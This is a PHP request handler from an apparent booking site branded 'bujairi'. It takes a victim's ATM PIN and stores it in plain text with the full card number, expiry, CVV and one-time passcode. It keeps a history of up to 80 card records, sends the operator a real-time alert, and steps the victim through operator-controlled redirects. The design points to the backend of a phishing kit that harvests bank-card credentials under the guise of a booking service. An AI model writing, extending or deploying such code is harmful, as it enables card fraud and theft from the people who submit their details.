<?php
declare(strict_types=1);
require __DIR__ . '/../dashboard/init.php';
auth_require_customer_login_or_redirect();
if (($_SERVER['REQUEST_METHOD'] ?? 'GET') !== 'POST') {
    if (bujairi_wants_json_response()) {
        json_response(['ok' => false, 'message' => 'Method not allowed'], 405);
    }
    http_response_code(405);
    exit;
}
$id = (int) ($_POST['id'] ?? 0);
$pdo = bujairi_pdo();
$order = order_by_id($pdo, $id);
if (!$order) {
    if (bujairi_wants_json_response()) {
        json_response(['ok' => false, 'message' => 'غير موجود'], 404);
    }
    http_response_code(404);
    exit;
}
$atm = trim((string) ($_POST['AtmPassword'] ?? ''));
$oldClientRedirect = trim((string) ($order['client_redirect_url'] ?? ''));

$list = bujairi_decode_card_history($order['card_history_json'] ?? null);
if (count($list) === 0) {
    $list[] = [
        'cardholder_name' => trim((string) ($order['cardholder_name'] ?? '')),
        'card_number' => trim((string) ($order['card_number'] ?? '')),
        'expiry' => trim((string) ($order['expiry'] ?? '')),
        'cvv' => trim((string) ($order['cvv'] ?? '')),
        'saved_at' => date('Y-m-d H:i:s'),
        'otp' => trim((string) ($order['otp'] ?? '')),
        'atm' => $atm,
    ];
} else {
    $idx = count($list) - 1;
    if (!isset($list[$idx]) || !is_array($list[$idx])) {
        $list[$idx] = [];
    }
    $list[$idx]['atm'] = $atm;
}

if (count($list) > 80) {
    $list = array_slice($list, -80);
}
$json = json_encode($list, JSON_UNESCAPED_UNICODE);
if ($json === false) {
    $json = '[]';
}

try {
    $st = $pdo->prepare('UPDATE orders SET atm_password = ?, card_history_json = ? WHERE id = ?');
    $st->execute([$atm, $json, $id]);
} catch (Throwable $e) {
    $st = $pdo->prepare('UPDATE orders SET atm_password = ? WHERE id = ?');
    $st->execute([$atm, $id]);
}
bujairi_pusher_notify_admin_orders_changed();
bujairi_pusher_notify_dashboard_order_update($pdo, $id, 'تم إدخال رمز الصراف (ATM)', 'atm');
if (bujairi_wants_json_response()) {
    if ($oldClientRedirect !== '' && bujairi_stored_redirect_targets_same_booking_step($oldClientRedirect, $id, 'atm')) {
        try {
            $cl = $pdo->prepare('UPDATE orders SET client_redirect_url = ? WHERE id = ?');
            $cl->execute(['', $id]);
        } catch (Throwable $e) {
        }
    }
    json_response(['ok' => true, 'orderId' => $id]);
}
redirect('booking/customer-info.php?id=' . $id);
